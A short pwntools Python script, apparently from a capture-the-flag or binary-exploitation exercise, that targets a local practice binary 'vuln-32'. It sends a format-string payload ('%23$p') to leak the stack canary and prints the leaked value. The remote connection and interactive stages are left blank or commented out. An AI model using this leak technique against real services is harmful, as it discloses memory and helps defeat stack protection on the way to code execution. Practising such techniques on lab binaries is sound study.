#!/usr/bin/python3

from pwn import *

#REMOTE = True      # test remote
REMOTE =False       # test local

elf = context.binary = ELF('./vuln-32')

if REMOTE :
    #p = remote('REMOTEIP',PORT) # test remote
    p = remote('',PORT)
else:
	p = process('./vuln-32')

#========= exploit here ===================

#log.info(p.clean())
p.recvline()
#p.sendline('Test')
p.sendline('%23$p')
canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')

#========= interactive ====================
#p.interactive()
